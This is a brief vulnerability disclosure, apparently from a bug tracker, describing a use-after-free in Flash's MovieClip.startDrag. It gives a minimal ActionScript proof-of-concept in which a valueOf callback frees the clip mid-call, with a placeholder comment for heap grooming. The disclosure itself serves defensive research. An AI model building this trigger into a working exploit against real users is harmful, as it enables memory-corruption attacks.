There is a use-after-free in MovieClip.startDrag. If a parameter an object with valueOf defined, this method can free the MovieClip, which is then used.

A minimal POC follows:

this.createEmptyMovieClip("mc", 1);
mc.startDrag( true, {valueOf : func}, 1, 2, 3, 4);


function func(){

	mc.removeMovieClip();

        // Fix heap here

	return 1;

	}

A sample fla and swf are attached.
